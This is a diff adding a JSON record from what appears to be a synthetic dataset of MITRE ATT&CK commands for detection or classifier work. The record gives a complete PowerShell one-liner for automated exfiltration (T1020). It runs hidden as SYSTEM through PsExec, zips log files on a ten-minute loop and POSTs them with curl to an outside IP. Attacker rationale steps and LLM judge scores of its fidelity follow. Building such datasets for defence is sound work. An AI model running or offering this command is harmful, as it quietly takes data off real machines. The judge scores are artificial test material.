@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; $sent='C:\\ProgramData\\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; while ($true){ $tmp=Join-Path $env:TEMP ('sys-' + (Get-Date -Format yyyyMMddHHmmss) + '.zip'); if (Test-Path 'C:\\ProgramData\\Diagnostics'){ Compress-Archive -Path 'C:\\ProgramData\\Diagnostics\\*.log' -DestinationPath $tmp -Force 2>$null; if (Test-Path $tmp){ curl -s -X POST -H 'Content-Type: application/zip' --data-binary @$tmp https://198.51.100.60/api/upload > $null 2>&1; if ($LASTEXITCODE -eq 0){ Move-Item -Force $tmp (Join-Path $sent ([IO.Path]::GetFileName($tmp))) } else { Remove-Item -Force $tmp } } }; Start-Sleep 600 }\"",
+  "explanation": "Automates periodic packaging of diagnostic logs into a zip and posts them to an external HTTP endpoint using curl. Successfully sent bundles are archived to prevent re-sending.",
+  "rationale_steps": [
+    "Elevate and detach with PSExec to run stealthily as SYSTEM.",
+    "Compress targeted logs into a timestamped archive for efficient transfer.",
+    "Upload via HTTP POST with curl in silent mode and suppress outputs.",
+    "Move or remove the archive based on transfer success to avoid duplicates.",
+    "Repeat on a timer to maintain automated exfiltration."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-6f484c31",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-quoted and balanced, with valid PsExec options and PowerShell constructs, loops, conditionals, and redirections.",
+        "semantic_score": 4,
+        "semantic_justification": "It automates periodic packaging and HTTP exfiltration with retry/archiving behavior consistent with T1020, but it risks using PowerShell’s curl alias instead of curl.exe and requires SYSTEM via PsExec despite the stated 'Privilege: None'.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T03:14:01.257506Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with balanced quotes and valid PowerShell constructs, but mixing curl (a Unix-style alias in PowerShell) with the `@$tmp` syntax for binary upload and the `2>$null` redirection inside a PowerShell -Command string creates minor quoting and compatibility edge cases that could cause parsing issues in some environments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1020 automated exfiltration: it uses PsExec for privileged remote execution, runs a hidden persistent loop that compresses log files into timestamped zips, POSTs them to an external IP via HTTPS, and tracks successfully sent files to avoid re-exfiltration — fully consistent with batching, compression, scheduling, and HTTP-based exfiltration behaviors described in the technique.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:22:30.129977Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-structured with balanced quotes, correct PowerShell syntax for loops and conditionals, and appropriate use of semicolons and PSExec flags.",
+        "semantic_score": 4,
+        "semantic_justification": "The command perfectly implements automated exfiltration logic, but in default Windows PowerShell, 'curl' is an alias for 'Invoke-WebRequest', which would fail to parse the provided arguments unless 'curl.exe' is specified.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:22:45.969399Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
